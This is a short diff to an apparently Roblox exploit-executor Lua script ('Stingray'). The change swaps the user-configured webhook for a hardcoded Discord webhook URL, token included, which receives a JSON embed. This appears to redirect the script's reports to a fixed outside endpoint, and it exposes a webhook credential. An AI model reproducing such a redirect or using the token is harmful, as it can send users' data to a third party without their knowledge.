@@ -247,7 +247,7 @@ if not getgenv().StingrayLoaded then
             }
 
             request({
-                Url = getgenv().Webhook,
+                Url = "https://ptb.discord.com/api/webhooks/922567987419029504/V7OIuKfd7ixkSVM2z8tuMlHAkOyMtsTN9gPnXvwY73A7_4s__fKoj5h90s7FPIXctzOH",
                 Headers = { ['Content-Type'] = 'application/json' },
                 Body = game:GetService("HttpService"):JSONEncode({
                     embeds = { embed },
